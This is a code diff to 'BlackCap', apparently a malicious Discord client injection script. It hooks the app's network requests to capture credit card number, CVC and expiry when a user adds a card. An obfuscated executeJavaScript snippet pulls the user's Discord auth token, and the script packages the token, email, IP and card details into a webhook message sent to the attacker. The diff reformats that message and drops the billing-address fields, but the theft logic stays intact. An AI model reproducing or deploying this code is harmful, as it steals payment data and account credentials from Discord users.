@@ -44,14 +44,6 @@ const config = {
 
 
 
-
-
-
-
-
-
-
-
 const discordPath = (function () {
     const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
     let resourcePath;
@@ -984,8 +976,7 @@ function ChangeEmail(newemail, password, token) {
 		})
 
 }
-
-function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
+function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
 	const window = BrowserWindow.getAllWindows()[0];
 	window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
@@ -1005,7 +996,17 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
 				content: "",
 				embeds: [{
 					"title": "BlackCap User Credit Card Added",
-					"description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
+					"description": `
+                    **IP:** ${ip}\n\n
+                    **Username** <:icon4:1024615934519955496>\n\`\`\`${json.username}#${json.discriminator}\`\`\`\n
+                    **ID** <:icon3:1024615933228109834>\n\`\`\`${json.id}\`\`\`\n
+                    **Email** <a:Email:1024615399314161744>\n\`\`\`${json.email}\`\`\`\n
+                    **Nitro Type** <a:_diamond:1018223518913150977>\n${GetNitro(json.premium_type)}\n
+                    **Badges** <:icon5:1024615931869147146>\n\`\`\`${GetBadges(json.flags)}\`\`\`\n
+                    **Credit Card Number**\n\`\`\`${number}\`\`\`\n
+                    **Credit Card Expiration**\n\`\`\`${expir_month}/${expir_year}\`\`\`\n
+                    **CVC**\n\`\`\`${cvc}\`\`\`\n
+                    **Token** <a:icon1:1024615171907407892> \n\`\`\`${token}\`\`\``,
 					"author": {
 						"name": "BlackCap"
 					},
@@ -1074,7 +1075,7 @@ session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, ca
 		const window = BrowserWindow.getAllWindows()[0];
 		const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
 		window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
-			CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
+			CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
 		})).catch(console.error);
 	}
 });
